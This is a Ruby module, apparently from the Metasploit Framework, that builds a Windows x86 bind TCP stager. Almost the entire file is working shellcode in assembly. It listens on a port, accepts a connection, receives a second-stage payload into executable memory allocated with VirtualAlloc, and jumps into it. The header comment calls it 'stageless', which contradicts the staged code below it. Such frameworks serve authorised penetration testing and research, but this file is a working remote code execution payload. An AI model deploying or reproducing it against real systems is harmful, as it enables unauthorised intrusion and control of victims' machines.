#-*- coding: binary -*-

require 'msf/core'

module Msf

##
#
# Implements stageless invocation of metsrv in x86
#
##

module Payload::Windows::BindTcp

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def asm_bind_tcp(opts={})
    asm = %Q^
      push 0x00003233   ; Push the bytes 'ws2_32',0,0 onto the stack.
      push 0x5F327377   ; ...
      push esp          ; Push a pointer to the "ws2_32" string on the stack.
      push 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
      call ebp          ; LoadLibraryA( "ws2_32" )
      
      mov eax, 0x0190   ; EAX = sizeof( struct WSAData )
      sub esp, eax      ; alloc some space for the WSAData structure
      push esp          ; push a pointer to this stuct
      push eax          ; push the wVersionRequested parameter
      push 0x006B8029   ; hash( "ws2_32.dll", "WSAStartup" )
      call ebp          ; WSAStartup( 0x0190, &WSAData );
      
      push 8
      pop ecx
    push_8_loop:
      push eax          ; if we succeed, eax will be zero, push it 8 times for
                        ; later ([1]-[8])
      loop push_8_loop

                        ; push zero for the flags param [8]
                        ; push null for reserved parameter [7]
                        ; we do not specify a WSAPROTOCOL_INFO structure [6]
                        ; we do not specify a protocol [5]
      inc eax           ;
      push eax          ; push SOCK_STREAM
      inc eax           ;
      push eax          ; push AF_INET
      push 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
      call ebp          ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
      xchg edi, eax     ; save the socket for later, don't care about the value of
                        ; eax after this
      
                        ; bind to 0.0.0.0, pushed earlier [4]
                        ; family AF_INET and port 4444
      push 0x#{[opts[:lport]].pack('v').unpack('H*').first}0002
      mov esi, esp      ; save a pointer to sockaddr_in struct
      push 16           ; length of the sockaddr_in struct (we only set the first
                        ; 8 bytes as the last 8 are unused)
      push esi          ; pointer to the sockaddr_in struct
      push edi          ; socket
      push 0x6737DBC2   ; hash( "ws2_32.dll", "bind" )
      call ebp          ; bind( s, &sockaddr_in, 16 );

                        ; backlog, pushed earlier [3]
      push edi          ; socket
      push 0xFF38E9B7   ; hash( "ws2_32.dll", "listen" )
      call ebp          ; listen( s, 0 );

                        ; we set length for the sockaddr struct to zero, pushed earlier [2]
                        ; we dont set the optional sockaddr param, pushed earlier [1]
      push edi          ; listening socket
      push 0xE13BEC74   ; hash( "ws2_32.dll", "accept" )
      call ebp          ; accept( s, 0, 0 );
    ^
      
    #if opts[:close_socket]
    if false
      asm << %Q^
        push edi          ; push the listening socket to close
        xchg edi, eax     ; replace the listening socket with the new connected socket
                          ; for further comms
        push 0x614D6E75   ; hash( "ws2_32.dll", "closesocket" )
        call ebp          ; closesocket( s );
      ^
    else
      asm << %Q^
        xchg edi, eax     ; replace the listening socket with the new connected socket
                          ; for further comms
      ^
    end

    asm << %Q^
      ; Receive the size of the incoming second stage...
      push 0              ; flags
      push 4              ; length = sizeof( DWORD );
      push esi            ; the 4 byte buffer on the stack to hold the second stage length
      push edi            ; the saved socket
      push 0x5FC8D902     ; hash( "ws2_32.dll", "recv" )
      call ebp            ; recv( s, &dwLength, 4, 0 );
      ; Alloc a RWX buffer for the second stage
      mov esi, [esi]      ; dereference the pointer to the second stage length
      push 0x40           ; PAGE_EXECUTE_READWRITE
      push 0x1000         ; MEM_COMMIT
      push esi            ; push the newly recieved second stage length.
      push 0              ; NULL as we dont care where the allocation is.
      push 0xE553A458     ; hash( "kernel32.dll", "VirtualAlloc" )
      call ebp            ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
      ; Receive the second stage and execute it...
      xchg ebx, eax       ; ebx = our new memory address for the new stage
      push ebx            ; push the address of the new stage so we can return into it
    read_more:            ;
      push 0              ; flags
      push esi            ; length
      push ebx            ; the current address into our second stage's RWX buffer
      push edi            ; the saved socket
      push 0x5FC8D902     ; hash( "ws2_32.dll", "recv" )
      call ebp            ; recv( s, buffer, length, 0 );
      add ebx, eax        ; buffer += bytes_received
      sub esi, eax        ; length -= bytes_received, will set flags
      jnz read_more       ; continue if we have more to read
      ret                 ; return into the second stage
    ^

    asm
  end

  def generate_bind_tcp
    conf = {
      :lport        => datastore['LPORT'].to_i,
      :close_socket => datastore['StagerCloseSocket'] || true
    }

    asm = asm_bind_tcp(conf)

    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end

end

end


